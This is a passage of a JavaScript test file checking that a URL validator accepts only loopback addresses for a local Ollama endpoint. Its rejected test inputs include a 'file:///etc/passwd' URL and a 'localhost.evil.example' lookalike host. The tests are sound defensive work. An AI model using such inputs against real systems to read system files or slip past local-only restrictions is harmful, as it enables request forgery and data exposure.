ok(loopbackBase("http://127.0.0.1:11434/v1", "Ollama") === "http://127.0.0.1:11434/v1", "url: path preserved");
ok(isLoopbackHost("127.127.1.2"), "url: 127/8 counts as loopback");
await throws(() => loopbackBase("http://example.com:11434", "Ollama"), "url: remote host rejected");
// WHATWG URL parsing canonicalizes octal/hex IPv4 spellings ("0177.0.0.1" → 127.0.0.1),
// so odd spellings of the loopback address are accepted as what they are: loopback.
ok(loopbackBase("http://0177.0.0.1:11434", "Ollama").startsWith("http://127.0.0.1:11434"), "url: octal ipv4 canonicalized to 127.0.0.1");
await throws(() => loopbackBase("ftp://127.0.0.1", "Ollama"), "url: non-http scheme rejected");
await throws(() => loopbackBase("http://user:pass@127.0.0.1:11434", "Ollama"), "url: credentials rejected");
await throws(() => loopbackBase("http://user@127.0.0.1:11434", "Ollama"), "url: username rejected");
await throws(() => loopbackBase("not a url", "Ollama"), "url: garbage rejected");
await throws(() => loopbackBase("file:///etc/passwd", "Ollama"), "url: file scheme rejected");
// DNS-name that RESOLVES to loopback is still a remote name → rejected (local-only is by name).
await throws(() => loopbackBase("http://localhost.evil.example:11434", "Ollama"), "url: lookalike hostname rejected");
// 0.0.0.0 is not loopback (it's "all interfaces") → rejected.
await throws(() => loopbackBase("http://0.0.0.0:11434", "Ollama"), "url: 0.0.0.0 rejected");

console.log(`\nsecurity.test: ${passed} passed, ${failures.length} failed`);
if (failures.length > 0) process.exit(1);
